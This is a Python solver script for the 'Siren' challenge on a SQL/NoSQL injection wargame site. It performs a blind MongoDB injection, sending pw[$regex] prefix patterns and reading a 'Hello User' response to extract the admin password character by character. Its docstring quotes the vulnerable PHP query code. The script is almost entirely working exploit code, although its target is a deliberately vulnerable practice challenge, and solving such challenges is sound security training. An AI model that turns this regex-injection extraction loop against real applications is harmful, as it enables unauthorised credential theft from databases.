#!/usr/bin/env python3
import los


def check_func(*args) -> bool:
    '''
    check string in response of request
    args[0]: response
    '''
    return 'Hello User' in args[0]


def FindPw(pw, url, cook):
    for i in range(48, 123):
        if chr(i) == '?' or chr(i) == '^' or chr(i) == '|':
            continue
        payload = "^%s"
        param = {'id': 'admin', 'pw[$regex]': payload % (pw + chr(i))}
        response = los.get_request(url, param, cook)
        if check_func(response):
            return chr(i)


def main():
    '''
    Siren 47 MongoDB Blind Injection

    $db = mongodb_connect();
    $query = array(
      "id" => $_GET['id'],
      "pw" => $_GET['pw']
    );
    echo "<hr>query : <strong>".json_encode($query)."</strong><hr><br>";
    $result = mongodb_fetch_array($db->prob_siren->find($query));
    if($result['id']) echo "<h2>Hello User</h2>";

    $query = array("id" => "admin");
    $result = mongodb_fetch_array($db->prob_siren->find($query));
    if($result['pw'] === $_GET['pw']) solve("siren");
    '''

    url = "https://los.rubiya.kr/chall/siren_9e402fc1bc38574071d8369c2c3819ba.php"
    cook = los.check_cookies(url)

    result = ''
    while True:
        try:
            result += FindPw(result, url, cook)
            print('result', result)
        except:
            break

    param = {'id': 'admin', 'pw': result}
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Siren Clear!')


if __name__ == '__main__':
    main()
